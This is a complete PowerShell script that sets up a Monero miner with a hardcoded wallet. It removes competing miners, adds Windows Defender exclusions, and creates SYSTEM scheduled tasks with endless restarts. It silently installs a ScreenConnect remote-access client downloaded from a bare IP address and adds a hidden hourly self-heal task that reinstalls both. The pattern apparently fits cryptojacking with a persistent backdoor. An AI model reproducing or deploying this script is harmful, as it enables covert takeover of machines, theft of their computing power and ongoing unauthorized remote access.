<#
  ============================================================
   RIG SETUP  —  one-shot: clean + XMRig + ScreenConnect + autostart
  ============================================================
   Designed for "run and walk away":
     - Every step is independent. If one fails, the rest still run.
     - Mining is the priority; it runs even if ScreenConnect fails.
     - Downloads retry a few times on flaky networks.
     - Everything is written to a log file so you can review it
       later from ScreenConnect without sitting at the machine.
     - Adds Windows Defender exclusions automatically.
     - Does NOT disable any antivirus. A machine with a heavy
       third-party AV may need a one-time manual exclusion for
       ScreenConnect; mining still works regardless.

   RUN (elevated PowerShell):
       powershell -ExecutionPolicy Bypass -File .\rig-setup.ps1

   Per machine: change $WorkerName. Set $ScreenConnectUrl once.
  ============================================================
#>

# ===================== EDIT THESE =====================
$Wallet           = "46pSeeqksaPb97W5ZsNibYfLGdRwTbkLqDR5nn1AMWgK58doHJVvdPhMuA8aE7J7Sd5pcXWRSK91vDeD71qqPYcZFkjgdaw"
$WorkerName       = "server3"
$ScreenConnectUrl = "http://172.86.74.124:8040/Bin/ScreenConnect.ClientSetup.exe?e=Access&y=Guest"   # .msi or .exe direct link
$Threads          = 95
$Priority         = 2
$AutoReboot       = $true     # $false to skip the reboot at the end
# =====================================================

# never stop the whole script on an error — we handle each step ourselves
$ErrorActionPreference = "Continue"
$ProgressPreference    = "SilentlyContinue"   # faster downloads
$ver = "6.26.0"
$dir = "C:\xmrig"
$log = "C:\rig-setup.log"

function Log($msg, $color="Gray") {
    $line = "[{0}] {1}" -f (Get-Date -Format "HH:mm:ss"), $msg
    Write-Host $line -ForegroundColor $color
    try { Add-Content -Path $log -Value $line -ErrorAction SilentlyContinue } catch {}
}

# download helper with retries — returns $true on success, never throws
function Get-FileSafe($url, $out, $tries=4) {
    for ($i=1; $i -le $tries; $i++) {
        try {
            Invoke-WebRequest $url -OutFile $out -UseBasicParsing -TimeoutSec 60
            if ((Test-Path $out) -and (Get-Item $out).Length -gt 0) { return $true }
        } catch {
            Log "  download attempt $i/$tries failed: $($_.Exception.Message)" "DarkYellow"
            Start-Sleep -Seconds ([math]::Min(10, $i*3))
        }
    }
    return $false
}

Log "===== RIG SETUP start ($WorkerName) =====" "Cyan"

# ---------- STEP 1: clean old miners ----------
try {
    Log "Step 1: cleaning old miners..." "Yellow"
    Get-ScheduledTask -ErrorAction SilentlyContinue | Where-Object {$_.TaskName -match "XMRig|Miner|xmrig"} | ForEach-Object {
        Stop-ScheduledTask -TaskName $_.TaskName -ErrorAction SilentlyContinue
        Unregister-ScheduledTask -TaskName $_.TaskName -Confirm:$false -ErrorAction SilentlyContinue
    }
    Get-Process xmrig -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
    Start-Sleep 2
    Get-ChildItem "C:\","C:\Users\Administrator\Downloads","C:\Users\Administrator\Desktop","$env:TEMP" -Directory -Filter "*xmrig*" -ErrorAction SilentlyContinue | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item "C:\xmrig" -Recurse -Force -ErrorAction SilentlyContinue
    Log "  old miners cleaned." "Green"
} catch { Log "  cleanup warning: $($_.Exception.Message)" "DarkYellow" }

# ---------- STEP 2: Defender exclusions (before download, so files survive) ----------
try {
    Log "Step 2: Windows Defender exclusions..."
    Add-MpPreference -ExclusionPath "C:\xmrig" -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionPath "C:\Program Files (x86)\ScreenConnect Client" -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionProcess "xmrig.exe" -ErrorAction SilentlyContinue
    Log "  exclusions set (Defender only; other AV untouched)." "Green"
} catch { Log "  Defender step skipped (maybe third-party AV): $($_.Exception.Message)" "DarkYellow" }

# ---------- STEP 3: install XMRig ----------
$minerOk = $false
try {
    Log "Step 3: downloading XMRig $ver..."
    $zip="$env:TEMP\x.zip"; $tmp="$env:TEMP\xx"
    if (Get-FileSafe "https://github.com/xmrig/xmrig/releases/download/v$ver/xmrig-$ver-windows-x64.zip" $zip) {
        if (Test-Path $tmp) { Remove-Item $tmp -Recurse -Force -ErrorAction SilentlyContinue }
        Expand-Archive $zip $tmp -Force
        $src=(Get-ChildItem $tmp -Directory | Select-Object -First 1).FullName
        New-Item -ItemType Directory $dir -Force | Out-Null
        Copy-Item "$src\*" $dir -Recurse -Force
        if (Test-Path "$dir\xmrig.exe") { $minerOk = $true; Log "  XMRig installed." "Green" }
        else { Log "  XMRig exe missing after extract." "Red" }
    } else { Log "  XMRig download failed after retries." "Red" }
} catch { Log "  XMRig install error: $($_.Exception.Message)" "Red" }

# ---------- STEP 4: large pages + power plan ----------
try {
    Log "Step 4: large pages + high-performance power plan..."
    $sid=(New-Object System.Security.Principal.NTAccount($env:USERNAME)).Translate([System.Security.Principal.SecurityIdentifier]).Value
    $c="$env:TEMP\sec.cfg"; secedit /export /cfg $c | Out-Null
    (Get-Content $c) -replace "SeLockMemoryPrivilege = .*","SeLockMemoryPrivilege = $sid" | Set-Content $c
    secedit /configure /db "$env:TEMP\s.sdb" /cfg $c /areas USER_RIGHTS | Out-Null
    powercfg /setactive 8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c 2>$null
    Log "  tuning applied." "Green"
} catch { Log "  tuning warning: $($_.Exception.Message)" "DarkYellow" }

# ---------- STEP 5: write config + autostart task ----------
if ($minerOk) {
    try {
        Log "Step 5: config + autostart task..."
        $j='{"autosave":true,"cpu":{"enabled":true,"huge-pages":true,"huge-pages-jit":true,"max-threads-hint":'+$Threads+',"priority":'+$Priority+'},"pools":[{"url":"gulf.moneroocean.stream:10001","user":"'+$Wallet+'","pass":"'+$WorkerName+'","tls":false,"keepalive":true}]}'
        [System.IO.File]::WriteAllText("$dir\config.json",$j,(New-Object System.Text.UTF8Encoding $false))
        $a=New-ScheduledTaskAction -Execute "$dir\xmrig.exe" -WorkingDirectory $dir
        $t=New-ScheduledTaskTrigger -AtStartup
        $pr=New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
        $s=New-ScheduledTaskSettingsSet -StartWhenAvailable -ExecutionTimeLimit 0 -RestartCount 999 -RestartInterval (New-TimeSpan -Minutes 1)
        Register-ScheduledTask -TaskName "XMRig-Miner" -Action $a -Trigger $t -Principal $pr -Settings $s -Force | Out-Null
        Start-ScheduledTask -TaskName "XMRig-Miner"
        Log "  miner task registered and started." "Green"
    } catch { Log "  config/task error: $($_.Exception.Message)" "Red" }
} else {
    Log "Step 5: skipped (XMRig not installed)." "DarkYellow"
}

# ---------- STEP 6: ScreenConnect (optional, best-effort) ----------
if ($ScreenConnectUrl -and $ScreenConnectUrl -notlike "PUT_*") {
    try {
        Log "Step 6: installing ScreenConnect (best-effort)..."
        $ext = if ($ScreenConnectUrl -match "\.exe($|\?)") { "exe" } else { "msi" }
        $scFile = "$env:TEMP\sc_agent.$ext"
        if (Get-FileSafe $ScreenConnectUrl $scFile) {
            if ($ext -eq "msi") { Start-Process msiexec.exe -ArgumentList "/i `"$scFile`" /qn /norestart" -Wait -ErrorAction SilentlyContinue }
            else { Start-Process $scFile -ArgumentList "/S" -Wait -ErrorAction SilentlyContinue }
            Log "  ScreenConnect install attempted." "Green"
        } else {
            Log "  ScreenConnect download blocked or failed. Mining unaffected. If this machine has 3rd-party AV, add a manual exclusion and re-run just this part." "DarkYellow"
        }
    } catch { Log "  ScreenConnect error (mining unaffected): $($_.Exception.Message)" "DarkYellow" }
} else {
    Log "Step 6: ScreenConnect URL not set - skipped." "DarkYellow"
}

# ---------- STEP 6.5: install self-heal watcher (retries failed parts hourly + at startup) ----------
try {
    Log "Step 6.5: installing self-heal watcher..."
    $healDir = "C:\rig"
    New-Item -ItemType Directory $healDir -Force | Out-Null
    try { Add-MpPreference -ExclusionPath $healDir -ErrorAction SilentlyContinue } catch {}
    # self-heal script content, with the ScreenConnect URL baked in
    $healScript = @'
$ErrorActionPreference="Continue"; $ProgressPreference="SilentlyContinue"; $log="C:\rig-setup.log"
$ScreenConnectUrl="__SC_URL__"
function Log($m){ try{ Add-Content $log ("[{0}] heal: {1}" -f (Get-Date -Format "HH:mm:ss"),$m) -ErrorAction SilentlyContinue }catch{} }
try { if(-not(Get-Process xmrig -ErrorAction SilentlyContinue)){ if(Get-ScheduledTask -TaskName "XMRig-Miner" -ErrorAction SilentlyContinue){ Start-ScheduledTask -TaskName "XMRig-Miner"; Log "miner down -> started." } } } catch { Log "miner check: $($_.Exception.Message)" }
try {
  $sc = (Test-Path "C:\Program Files (x86)\ScreenConnect Client") -or (Get-Service -Name "ScreenConnect*" -ErrorAction SilentlyContinue)
  if(-not $sc -and $ScreenConnectUrl -and $ScreenConnectUrl -notlike "__*__"){
    Log "ScreenConnect missing -> retry install."
    $ext= if($ScreenConnectUrl -match "\.exe($|\?)"){"exe"}else{"msi"}; $f="$env:TEMP\sc_agent.$ext"; $ok=$false
    for($i=1;$i -le 3;$i++){ try{ Invoke-WebRequest $ScreenConnectUrl -OutFile $f -UseBasicParsing -TimeoutSec 60; if((Test-Path $f)-and (Get-Item $f).Length -gt 0){$ok=$true;break} }catch{ Start-Sleep ($i*4) } }
    if($ok){ if($ext -eq "msi"){ Start-Process msiexec.exe -ArgumentList "/i `"$f`" /qn /norestart" -Wait -ErrorAction SilentlyContinue } else { Start-Process $f -ArgumentList "/S" -Wait -ErrorAction SilentlyContinue }; Log "SC re-install attempted." }
    else { Log "SC still blocked/unreachable. retry next run." }
  }
} catch { Log "SC check: $($_.Exception.Message)" }
'@
    $healScript = $healScript.Replace("__SC_URL__", $ScreenConnectUrl)
    [System.IO.File]::WriteAllText("$healDir\selfheal.ps1", $healScript, (New-Object System.Text.UTF8Encoding $false))

    $ha = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$healDir\selfheal.ps1`""
    $ht1 = New-ScheduledTaskTrigger -AtStartup
    $ht2 = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(5) -RepetitionInterval (New-TimeSpan -Hours 1)
    $hpr = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
    $hs  = New-ScheduledTaskSettingsSet -StartWhenAvailable -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
    Register-ScheduledTask -TaskName "Rig-SelfHeal" -Action $ha -Trigger $ht1,$ht2 -Principal $hpr -Settings $hs -Force | Out-Null
    Log "  self-heal watcher installed (startup + hourly)." "Green"
} catch { Log "  self-heal install warning: $($_.Exception.Message)" "DarkYellow" }

# ---------- STEP 7: summary + optional reboot ----------
Start-Sleep 4
$running = [bool](Get-Process xmrig -ErrorAction SilentlyContinue)
Log "===== SUMMARY: miner=$([int]$minerOk) running=$([int]$running) worker=$WorkerName =====" "Cyan"
if ($running) { Log "DONE. Mining as '$WorkerName'. Track: moneroocean.stream" "Green" }
else { Log "Miner not running yet - it will auto-start after reboot." "Yellow" }
Log "Full log at $log" "Gray"

if ($AutoReboot) {
    Log "Rebooting in 12s... press Ctrl+C to cancel." "Yellow"
    Start-Sleep 12
    Restart-Computer -Force
}
